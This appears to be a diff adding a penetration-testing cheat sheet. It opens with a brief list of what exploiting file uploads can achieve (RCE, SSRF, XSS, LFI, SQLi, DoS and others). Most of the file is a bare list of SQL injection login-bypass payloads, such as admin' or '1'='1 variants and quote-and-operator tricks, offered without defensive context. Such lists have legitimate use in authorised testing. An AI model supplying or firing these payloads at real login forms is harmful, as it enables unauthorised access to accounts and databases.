@@ -1,0 +1,55 @@
+**** What can you achieve by exploiting file uploading:
+
+* RCE
+* SSRF
+* XSS
+* LFI
+* XXE
+* Phishing
+* Parameter Pollution
+* Uploader may disclose internal paths
+* SQLI
+* DoS
+Mnay more ....
+
+**** SQL Injection and Bypass
+
+"-"
+" "
+"&"
+"^"
+"*"
+" or ""-"
+" or "" "
+" or ""&"
+" or ""^"
+" or ""*"
+'=' 'or'
+' or ''='
+/1#\
+'-'
+' '
+'&'
+'^'
+'*'
+' or ''-'
+' or '' '
+' or ''&'
+' or ''^'
+admin' or '1'='1' /*
+admin') or ('1'='1
+admin') or ('1'='1'--
+admin') or ('1'='1'#
+admin') or ('1'='1' /*
+admin') or '1'='1
+admin') or '1'='1' --
+admin') or '1'='1'#
+admin') or '1'='1' /*
+admin" --
+admin" or "1"="1"--
+admin" or "1"="1"#
+admin" or "1"="1"/*
+admin"or 1=1 or ""="
+
+**** 
+
